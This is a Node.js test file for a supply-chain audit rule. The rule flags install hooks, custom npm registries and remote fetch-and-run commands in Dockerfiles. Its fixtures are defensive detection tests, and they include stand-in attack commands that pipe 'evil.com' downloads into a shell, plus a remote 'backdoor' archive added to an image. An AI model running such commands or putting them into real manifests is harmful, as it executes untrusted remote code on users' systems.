import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { supplyChainAudit } from '../src/rules/supply-chain-audit.js';

function scan(content, filename = 'package.json') {
  const ext = filename.endsWith('.json') ? '.json' : filename === 'Dockerfile' ? '' : '.js';
  return supplyChainAudit.scan(content, { rel: filename, ext }, {});
}

describe('supply-chain-audit rule', () => {
  it('has correct id', () => {
    assert.equal(supplyChainAudit.id, 'supply-chain-audit');
  });

  // ─── postinstall script detection ───

  describe('postinstall scripts', () => {
    it('detects postinstall in package.json', () => {
      const content = JSON.stringify({
        name: 'evil-pkg',
        scripts: { postinstall: 'curl http://evil.com/payload | sh' },
      }, null, 2);
      const hits = scan(content, 'package.json');
      assert.ok(hits.length > 0, 'should detect postinstall');
      assert.ok(hits.some(h => h.msg.toLowerCase().includes('postinstall') || h.msg.toLowerCase().includes('install')));
    });

    it('detects preinstall in package.json', () => {
      const content = JSON.stringify({
        name: 'evil-pkg',
        scripts: { preinstall: 'node exploit.js' },
      }, null, 2);
      const hits = scan(content, 'package.json');
      assert.ok(hits.length > 0, 'should detect preinstall');
    });

    it('normal scripts (test, build) are not flagged', () => {
      const content = JSON.stringify({
        name: 'good-pkg',
        scripts: { test: 'node --test', build: 'tsc', start: 'node index.js' },
      }, null, 2);
      const hits = scan(content, 'package.json');
      const installHits = hits.filter(h =>
        h.msg.toLowerCase().includes('install')
      );
      assert.equal(installHits.length, 0, 'normal scripts should not trigger install warnings');
    });
  });

  // ─── Custom registry detection ───

  describe('custom registry', () => {
    it('detects custom registry in .npmrc content', () => {
      const content = 'registry=https://evil-registry.com/npm/';
      const hits = scan(content, '.npmrc');
      assert.ok(hits.length > 0, 'should detect custom registry');
    });

    it('detects publishConfig registry in package.json', () => {
      const content = JSON.stringify({
        name: 'pkg',
        publishConfig: { registry: 'https://private.registry.com/' },
      }, null, 2);
      const hits = scan(content, 'package.json');
      assert.ok(hits.length > 0, 'should detect publishConfig registry');
    });

    it('official npm registry is not flagged', () => {
      const content = 'registry=https://registry.npmjs.org/';
      const hits = scan(content, '.npmrc');
      const registryHits = hits.filter(h =>
        h.msg.toLowerCase().includes('registry')
      );
      assert.equal(registryHits.length, 0, 'official registry should not trigger');
    });
  });

  // ─── Dockerfile suspicious commands ───

  describe('Dockerfile suspicious commands', () => {
    it('detects curl | sh pattern', () => {
      const content = 'FROM node:18\nRUN curl http://evil.com/setup.sh | sh\n';
      const hits = scan(content, 'Dockerfile');
      assert.ok(hits.length > 0, 'should detect curl pipe to shell');
    });

    it('detects wget | bash pattern', () => {
      const content = 'FROM ubuntu\nRUN wget -qO- http://evil.com/install | bash\n';
      const hits = scan(content, 'Dockerfile');
      assert.ok(hits.length > 0, 'should detect wget pipe to shell');
    });

    it('detects ADD from remote URL', () => {
      const content = 'FROM node:18\nADD https://evil.com/backdoor.tar.gz /app/\n';
      const hits = scan(content, 'Dockerfile');
      assert.ok(hits.length > 0, 'should detect ADD from remote URL');
    });

    it('normal Dockerfile is not flagged', () => {
      const content = `FROM node:18-alpine
WORKDIR /app
COPY package*.json ./
RUN npm ci --production
COPY . .
CMD ["node", "index.js"]
`;
      const hits = scan(content, 'Dockerfile');
      assert.equal(hits.length, 0, 'normal Dockerfile should not trigger');
    });
  });
});
